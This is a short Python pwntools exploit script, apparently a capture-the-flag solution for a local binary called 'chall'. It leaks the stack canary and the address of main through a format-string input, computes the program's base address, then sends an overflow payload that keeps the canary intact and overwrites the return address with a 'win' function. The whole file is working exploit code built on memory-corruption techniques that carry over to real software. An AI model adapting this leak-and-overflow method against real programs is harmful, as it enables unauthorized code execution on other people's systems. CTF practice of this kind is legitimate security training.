import pwn
import sys

elf = pwn.ELF('./chall')
io = elf.process()
print(io.recv(100000).decode("utf-8"))
#Get the canary at 33 and get a the main function at 17
io.sendline(b"%17$lx.%33$lx")
canary = str(io.recvline().decode("utf-8")).split(" ")
canary = canary[1].split(".")
knownAddress = "0000"+canary[0]
canary = canary[1]
print(canary)
print(knownAddress)
#Get the hint
canary = int(canary, 16)
knownAddress = int(knownAddress, 16)
#Take hint and subtract the symbol
#Set base address
elf.address = knownAddress - elf.sym['main']

new_eip = pwn.p64(elf.sym['win'])
canary = pwn.p64(canary)
#create payload with win address and offset
payload = b"".join(
    [
        b"0" * 24,
        canary,
        b"A" * 8,
        new_eip
    ]
)
io.sendline(payload)
print(io.recvrepeat(1).decode("utf-8"))